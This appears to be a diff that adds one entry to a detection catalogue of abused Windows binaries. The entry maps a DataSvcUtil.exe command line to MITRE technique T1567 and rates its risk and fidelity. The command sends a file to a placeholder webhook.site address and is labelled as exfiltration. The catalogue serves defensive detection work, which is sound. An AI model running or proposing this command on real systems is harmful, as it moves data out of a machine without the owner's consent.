@@ -1,0 +1,19 @@
+- command: DataSvcUtil /out:C:\\Windows\\System32\\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile
+  description: Abusing DataSvcUtil.exe to exfiltrate calc.exe to the given remote destination.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Exfiltration:
+      - T1567
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/DataSvcUtil/
+  risk: High
+  risk_reason: This is an extremely suspicious action for most normal users.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically extremely rare for most organizations.
+  tool: DataSvcUtil
+  threatactors:
+    N/A:
+      - N/A
